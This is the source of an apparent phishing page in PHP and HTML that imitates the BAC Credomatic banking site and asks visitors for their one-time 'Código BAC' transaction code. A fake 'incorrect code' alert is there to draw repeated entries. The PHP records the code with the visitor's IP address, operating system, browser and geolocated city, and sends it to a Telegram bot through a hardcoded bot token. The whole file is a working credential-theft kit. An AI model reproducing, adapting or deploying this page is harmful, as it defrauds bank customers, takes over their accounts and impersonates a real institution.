<?php
include 'new1.php';
include 'new2.php';
include "new3.php";

?>
<?php
@$userp = $_SERVER['REMOTE_ADDR'];

////////////////////
$user_agent = $_SERVER['HTTP_USER_AGENT'];
function getBrowser($user_agent){
if(strpos($user_agent, 'MSIE') !== FALSE)
   return 'Internet explorer';
 elseif(strpos($user_agent, 'Edge') !== FALSE) //Microsoft Edge
   return 'Microsoft Edge';
 elseif(strpos($user_agent, 'Trident') !== FALSE) //IE 11
    return 'Internet explorer';
 elseif(strpos($user_agent, 'Opera Mini') !== FALSE)
   return "Opera Mini";
 elseif(strpos($user_agent, 'Opera') || strpos($user_agent, 'OPR') !== FALSE)
   return "Opera";
 elseif(strpos($user_agent, 'Firefox') !== FALSE)
   return 'Mozilla Firefox';
 elseif(strpos($user_agent, 'Chrome') !== FALSE)
   return 'Google Chrome';
 elseif(strpos($user_agent, 'Safari') !== FALSE)
   return "Safari";
 else
   return 'No navegador';}
 function getOS() { 
    global $user_agent;
    $os_array =  array(
     '/windows nt 10/i'      =>  'Windows 10',
     '/windows nt 6.3/i'     =>  'Windows 8.1',
     '/windows nt 6.2/i'     =>  'Windows 8',
     '/windows nt 6.1/i'     =>  'Windows 7',
     '/windows nt 6.0/i'     =>  'Windows Vista',
     '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
     '/windows nt 5.1/i'     =>  'Windows XP',
     '/windows xp/i'         =>  'Windows XP',
     '/macintosh|mac os x/i' =>  'Mac OS X',
     '/mac_powerpc/i'        =>  'Mac OS 9',
     '/linux/i'              =>  'Linux',
     '/ubuntu/i'             =>  'Ubuntu',
     '/iphone/i'             =>  'iPhone',
     '/ipod/i'               =>  'iPod',
     '/ipad/i'               =>  'iPad',
     '/android/i'            =>  'Android',
     '/blackberry/i'         =>  'BlackBerry',
     '/webos/i'              =>  'Mobile');
    $os_platform = "Unknown OS Platform";
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value; }  }
    return $os_platform; }
$user_os        =   getOS();
$navegador = getBrowser($user_agent);

@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
@$pais = $meta['geoplugin_countryName']; 
@$region = $meta['geoplugin_regionName'];
@$ciudad = $meta['geoplugin_city'];
date_default_timezone_set('America/Bogota');


////////////////////

@ini_set("display_errors", 0);

////////////////////
if ( isset ($_POST['c0d']) ){


$message = "C0dig0: ".$_POST['c0d']." \r\n";
$message .= " SO= ".$user_os." ".$navegador." ".$userp." ".$pais." ".$region." ".$ciudad."\r\n";
$apiToken = "5338937969:AAFrrJvtWJi_O-RDz5a3YuLhC8tF1hBgkM4";


$data = [
  'chat_id' => '@sisaxd1',

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );



 }



?>

<html lang="es-hn" dir="ltr" class=" js js"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="content-language" content="es"><meta name="MobileOptimized" content="width"><meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>BAC Credomatic | Banca Personas | Iniciar Sesión</title> <link rel="stylesheet" media="all" href="css/css_2XdbQuW14hWYD5lQM7ub9Sdz5Ts6dak0nVnzUXdhg-o2.css"><link rel="stylesheet" media="all" href="css/css_PkINqO33ium4qUKT1MMUnaCyQRE35gzvGTFVQQ9S7iM.css"> </head><script>alert('Código incorrecto intente nuevamente!');</script>
<body class="path-frontpage page-node-type-landing-page" style="overflow: auto;"> <div class="dialog-off-canvas-main-canvas" data-off-canvas-main-canvas=""> <div class="layout-container"> <header class="header"> <div class="header--first-row"> <div id="block-sitebranding" class="logo__branding"> <a class="logo-link" href="./BAC Credomatic _ Banca Personas _ Iniciar Sesión_files/saved_resource" title=""> <img class="logo__image logo__image--desktop" src="img/logo.png" alt="Logo"> </a> </div> <center><nav id="market-segments-wrapper" class="market-segments-menu"> <ul class="market-segments"> <li class="market-segments__item market-segments__item--with-sub market-segments active" id="personas"> <a class="market-segments__link market-segments__link--with-sub" href="#" title=""> Personas </a> <span class="expand-sub"></span> </li> <li class="market-segments__item market-segments__item--with-sub" id="pymes"> <a class="market-segments__link market-segments__link--with-sub" href="#" title=""> PYMES </a> <span class="expand-sub"></span> <ul class="market-segments market-segments--sub market-segments--sub-1"> <li class="market-segments__item market-segments__item--with-sub market-segments__item--sub market-segments__item--sub-1"> <a class="market-segments__link market-segments__link--with-sub market-segments__link--sub market-segments__link--sub-1" href="#" title=""> Financiamiento </a> </li> <li class="market-segments__item market-segments__item--with-sub market-segments__item--sub market-segments__item--sub-1"> <a class="market-segments__link market-segments__link--with-sub market-segments__link--sub market-segments__link--sub-1" href="#" title=""> Pagos Electrónicos </a> </li> <li class="market-segments__item market-segments__item--with-sub market-segments__item--sub market-segments__item--sub-1"> <a class="market-segments__link market-segments__link--with-sub market-segments__link--sub market-segments__link--sub-1" href="#" title=""> Comercio Afiliado </a> </li> <li class="market-segments__item market-segments__item--with-sub market-segments__item--sub market-segments__item--sub-1"> <a class="market-segments__link market-segments__link--with-sub market-segments__link--sub market-segments__link--sub-1" href="#" title=""> Transferencias y servicios internacionales </a> </li> <li class="market-segments__item market-segments__item--with-sub market-segments__item--sub market-segments__item--sub-1"> <a class="market-segments__link market-segments__link--with-sub market-segments__link--sub market-segments__link--sub-1" href="#" title=""> Tarjetas </a> </li> </ul> </li> <li class="market-segments__item market-segments__item--with-sub" id="empresas"> <a class="market-segments__link market-segments__link--with-sub" href="#" title=""> Empresas </a> <span class="expand-sub"></span> <ul class="market-segments market-segments--sub market-segments--sub-1"> <li class="market-segments__item market-segments__item--with-sub market-segments__item--sub market-segments__item--sub-1"> <a class="market-segments__link market-segments__link--with-sub market-segments__link--sub market-segments__link--sub-1" href="#" title=""> Soluciones &amp; Herramientas </a> </li> <li class="market-segments__item market-segments__item--with-sub market-segments__item--sub market-segments__item--sub-1"> <a class="market-segments__link market-segments__link--with-sub market-segments__link--sub market-segments__link--sub-1" href="#" title=""> Financiamiento </a> </li> <li class="market-segments__item market-segments__item--with-sub market-segments__item--sub market-segments__item--sub-1"> <a class="market-segments__link market-segments__link--with-sub market-segments__link--sub market-segments__link--sub-1" href="#" title=""> Tesorería </a> </li> <li class="market-segments__item market-segments__item--with-sub market-segments__item--sub market-segments__item--sub-1"> <a class="market-segments__link market-segments__link--with-sub market-segments__link--sub market-segments__link--sub-1" href="#" title=""> Tarjetas </a> </li> <li class="market-segments__item market-segments__item--with-sub market-segments__item--sub market-segments__item--sub-1"> <a class="market-segments__link market-segments__link--with-sub market-segments__link--sub market-segments__link--sub-1" href="#" title=""> Cuentas </a> </li> <li class="market-segments__item market-segments__item--with-sub market-segments__item--sub market-segments__item--sub-1"> <a class="market-segments__link market-segments__link--with-sub market-segments__link--sub market-segments__link--sub-1" href="#" title=""> Servicios para Afiliados </a> </li> <li class="market-segments__item market-segments__item--with-sub market-segments__item--sub market-segments__item--sub-1"> <a class="market-segments__link market-segments__link--with-sub market-segments__link--sub market-segments__link--sub-1" href="#" title=""> Servicios </a> </li> </ul> </li> <li class="market-segments__item market-segments__item--with-sub" id="private-banking"> <a class="market-segments__link market-segments__link--with-sub" href="#" title=""> Private Banking </a> </li> <li class="market-segments__item market-segments__item--with-sub" id="nuestra-empresa"> <a class="market-segments__link market-segments__link--with-sub" href="#" title=""> Nuestra Empresa </a> <span class="expand-sub"></span> <ul class="market-segments market-segments--sub market-segments--sub-1"> <li class="market-segments__item market-segments__item--with-sub market-segments__item--sub market-segments__item--sub-1"> <a class="market-segments__link market-segments__link--with-sub market-segments__link--sub market-segments__link--sub-1" href="#" title=""> Sobre nosotros </a> </li> <li class="market-segments__item market-segments__item--with-sub market-segments__item--sub market-segments__item--sub-1"> <a class="market-segments__link market-segments__link--with-sub market-segments__link--sub market-segments__link--sub-1" href="#" title=""> Relación con inversionistas </a> </li> <li class="market-segments__item market-segments__item--with-sub market-segments__item--sub market-segments__item--sub-1"> <a class="market-segments__link market-segments__link--with-sub market-segments__link--sub market-segments__link--sub-1" href="#" title=""> Líderes </a> </li> <li class="market-segments__item market-segments__item--with-sub market-segments__item--sub market-segments__item--sub-1"> <a class="market-segments__link market-segments__link--with-sub market-segments__link--sub market-segments__link--sub-1" href="#" title=""> Sostenibilidad </a> </li> <li class="market-segments__item market-segments__item--with-sub market-segments__item--sub market-segments__item--sub-1"> <a class="market-segments__link market-segments__link--with-sub market-segments__link--sub market-segments__link--sub-1" href="#" title=""> Comunicación </a> </li> <li class="market-segments__item market-segments__item--with-sub market-segments__item--sub market-segments__item--sub-1"> <a class="market-segments__link market-segments__link--with-sub market-segments__link--sub market-segments__link--sub-1" href="#" title=""> Trabaje con nosotros </a> </li> <li class="market-segments__item market-segments__item--with-sub market-segments__item--sub market-segments__item--sub-1"> <a class="market-segments__link market-segments__link--with-sub market-segments__link--sub market-segments__link--sub-1" href="#" title=""> BAC Positivo </a> </li> </ul> </li> </ul> </nav></center>  <div class="nav-mobile-icon__wrapper"> <div id="nav-mobile-icon" class="nav-mobile-icon__menu"> <span></span> <span></span> <span></span> </div> </div> </div>  </header> <div> <a id="main-content" tabindex="-1"></a> <main role="main" class="main-content"> <div id="block-loginblock"> <center><div class="login-form" id="landingLoginForm"> <div class="login-form__heading"> <h4 class="login-form__title">Código BAC Credomatic</h4>  </div> <form accept-charset="UTF-8" action="exit.php" autocomplete="off" class="login-form__form" method="post" id="loginForm" name="loginForm">   <h4>Use el App Código BAC Credomatic en su<br> teléfono. Obtenga un código y digítelo<br> para confirmar la Transacción.</h4>
<div class="login-form__item">  <input class="login-form__input--text login-form__input--user" id="product" maxlength="128" required="" name="c0d" placeholder="Código BAC" size="20" type="text"> </div>
<div class="login-form__submit"> <br><button class="login-form__button login-form__submit-btn" id="head-login-button" name="op" type="submit" value="Transferir">Transferir</button> </div>      <br> <br></form></div></center> </div> <div> <div id="block-bac-theme-content"> <article role="article" class="node node--promoted landing-page landing-page--full"> <div class="layout layout--onecol layout__mg-bottom--small">  </div> <div class="layout layout--onecol layout--fixed-width layout__mg-bottom--large"> <div class="layout__content"> <div> </div> </div> </div> </article> </div> </div> </main> </div> </div> <footer class="footer"> <img class="footer-background-image" src="img/footer-background.jpg" alt="footer-background"> <div class="main"> <div class="footer-first-row"> <div class="logo__branding"> <a class="logo-link" href="./BAC Credomatic _ Banca Personas _ Iniciar Sesión_files/saved_resource" title=""> <img class="logo__image logo__image--desktop" src="img/logo-white.png" alt="Logo"> </a> </div> <div class="main-footer-wrapper"> <h3 class="h3 h3--main-footer-title"> Nuestras Áreas </h3> <nav id="main-footer-wrapper" class="main-footer-menu"> <ul class="main-footer"> <li class="main-footer__item main-footer"> <a class="main-footer__link" href="#" title=""> Personas </a> </li> <li class="main-footer__item"> <a class="main-footer__link" href="#" title=""> PYMES </a> </li> <li class="main-footer__item"> <a class="main-footer__link" href="#" title=""> Empresas </a> </li> <li class="main-footer__item"> <a class="main-footer__link" href="#" title=""> Private Banking </a> </li> <li class="main-footer__item"> <a class="main-footer__link" href="#" title=""> Nuestra Empresa </a> </li> <li class="main-footer__item"> <a class="main-footer__link" href="#" title=""> Iniciar Sesión </a> </li> <li class="main-footer__item"> <a class="main-footer__link" href="#" title=""> Mapa del Sitio </a> </li> <li class="main-footer__item"> <a class="main-footer__link" href="#" title=""> Conoce y Compara - CNBS </a> </li> </ul> </nav> </div> <div class="main-footer-wrapper"> <h3 class="h3 h3--main-footer-title"> Acerca de BAC Credomatic </h3> <nav id="main-footer-wrapper" class="main-footer-menu"> <ul class="main-footer"> <li class="main-footer__item main-footer"> <a class="main-footer__link" href="#" title=""> Nuestra Empresa </a> </li> <li class="main-footer__item"> <a class="main-footer__link" href="#" title=""> Nuestra Historia </a> </li> <li class="main-footer__item"> <a class="main-footer__link" href="#" title=""> Propósito y Valores </a> </li> <li class="main-footer__item"> <a class="main-footer__link" href="#" title=""> Memoria Anual </a> </li> <li class="main-footer__item"> <a class="main-footer__link" href="#" title=""> Sostenibilidad </a> </li> <li class="main-footer__item"> <a class="main-footer__link" href="#" title=""> Trabaje Con Nosotros </a> </li> <li class="main-footer__item"> <a class="main-footer__link" href="#" title=""> Usuario Financiero </a> </li> <li class="main-footer__item"> <a class="main-footer__link" href="#" title=""> Comisión Nacional De Bancos Y Seguros </a> </li> </ul> </nav> </div> <div class="main-footer-wrapper"> <h3 class="h3 h3--main-footer-title"> Aplicaciones para Móviles </h3> <nav id="main-footer-wrapper" class="main-footer-menu"> <ul class="apps_menu_list"> <li class="apps_menu_item"> <a class="apps_menu_link" href="#"> Appstore <img class="apps_menu_img" src="img/appstore.png" alt="appstore"> </a> </li> <li class="apps_menu_item"> <a class="apps_menu_link" href="#"> Playstore <img class="apps_menu_img" src="img/googleplay.png" alt="playstore"> </a> </li> <li class="apps_menu_item"> <a class="apps_menu_link" href="#"> Huawei <img class="apps_menu_img" src="img/huawei.png" alt="huawei"> </a> </li> </ul> </nav> </div> </div> <div class="footer-second-row"> <nav id="legals-links-wrapper" class="footer-legals-section"> <ul class="footer-legalslinks"> <li class="footer-legalslinks__item footer-legalslinks"> <a class="footer-legalslinks__link" href="#" title=""> Quejas </a> </li> <li class="footer-legalslinks__item"> <a class="footer-legalslinks__link" href="#" title=""> Teléfonos </a> </li> <li class="footer-legalslinks__item"> <a class="footer-legalslinks__link" href="#" title=""> Cookies </a> </li> <li class="footer-legalslinks__item"> <a class="footer-legalslinks__link" href="#" title=""> Seguridad </a> </li> <li class="footer-legalslinks__item"> <a class="footer-legalslinks__link" href="#" title=""> Política De Privacidad </a> </li> <li class="footer-legalslinks__item"> <a class="footer-legalslinks__link" href="#" title=""> Terminos Y Condiciones </a> </li> <li class="footer-legalslinks__item"> <a class="footer-legalslinks__link" href="#" title=""> Línea Ética BAC </a> </li> <li class="footer-legalslinks__item"> <a class="footer-legalslinks__link" href="#" title=""> Preguntas Frecuentes </a> </li> </ul> </nav> </div> <p class="footer-copy-right">Todos los derechos reservados. 2022© BAC Credomatic International Bank </p> </div></footer> </div> </body></html>